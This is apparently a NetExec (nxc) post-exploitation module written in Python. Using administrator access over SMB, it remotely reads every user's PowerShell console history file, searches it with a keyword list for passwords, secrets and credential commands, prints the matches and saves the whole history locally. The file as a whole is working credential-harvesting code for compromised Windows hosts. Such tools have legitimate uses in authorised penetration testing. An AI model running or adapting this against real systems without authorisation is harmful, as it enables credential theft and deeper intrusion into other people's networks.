import traceback
from impacket.examples.secretsdump import RemoteOperations

class NXCModule:
    """Module by @357384n"""

    name = "powershell_history"
    description = "Extracts PowerShell history for all users and looks for sensitive commands."
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        """Define module options."""
        pass

    def execute_command(self, connection, command):
        """Execute a command on the remote system and return the output."""
        output = connection.execute(command, True)
        return output

    def get_powershell_history(self, connection):
        """Get the PowerShell history for all users."""
        history_paths_command = 'powershell.exe "type C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"'
        try:
            history_output = self.execute_command(connection, history_paths_command)
            return history_output.split('\n')
        except Exception as e:
            raise Exception(f"Could not retrieve PowerShell history: {e}")

    def analyze_history(self, history):
        """Analyze PowerShell history for sensitive information."""
        sensitive_keywords = [
            "password", "passwd", "secret", "credential", "key",
            "get-credential", "convertto-securestring", "set-localuser",
            "new-localuser", "set-adaccountpassword", "new-object system.net.webclient",
            "invoke-webrequest", "invoke-restmethod"
        ]
        sensitive_commands = []
        for command in history:
            command_lower = command.lower()
            if any(keyword.lower() in command_lower for keyword in sensitive_keywords):
                sensitive_commands.append(command.strip())
        return sensitive_commands

    def on_admin_login(self, context, connection):
        """Main function to retrieve and analyze PowerShell history."""
        try:
            context.log.info("Retrieving PowerShell history...")
            history = self.get_powershell_history(connection)
            if history:
                sensitive_commands = self.analyze_history(history)
                if sensitive_commands:
                    context.log.highlight("Sensitive commands found in PowerShell history:")
                    for command in sensitive_commands:
                        context.log.highlight(f"  {command}")
                else:
                    context.log.info("No sensitive commands found in PowerShell history.")
            else:
                context.log.info("No PowerShell history found.")
            
            # Write history to file in current directory
            with open("powershell_history.txt", "w") as file:
                for cmd in history:
                    file.write(cmd + "\n")
            print("History written to powershell_history.txt")

        except Exception as e:
            context.log.fail(f"UNEXPECTED ERROR: {e}")
            context.log.debug(traceback.format_exc())
